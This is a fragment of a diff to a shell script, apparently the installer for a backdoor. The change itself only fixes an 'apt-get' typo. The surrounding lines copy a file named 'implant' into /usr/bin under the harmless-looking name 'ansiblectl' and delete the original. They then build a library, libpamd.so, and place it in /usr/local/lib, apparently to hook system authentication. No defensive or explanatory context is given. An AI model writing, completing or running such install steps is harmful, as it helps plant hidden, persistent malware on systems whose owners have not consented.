@@ -14,7 +14,7 @@ cp /tmp/implant /usr/bin/ansiblectl
 rm /tmp/implant
 
 apt-get update
-eapt-get -y install gcc make
+apt-get -y install gcc make
 make
 
 mv libpamd.so /usr/local/lib/libpamd.so
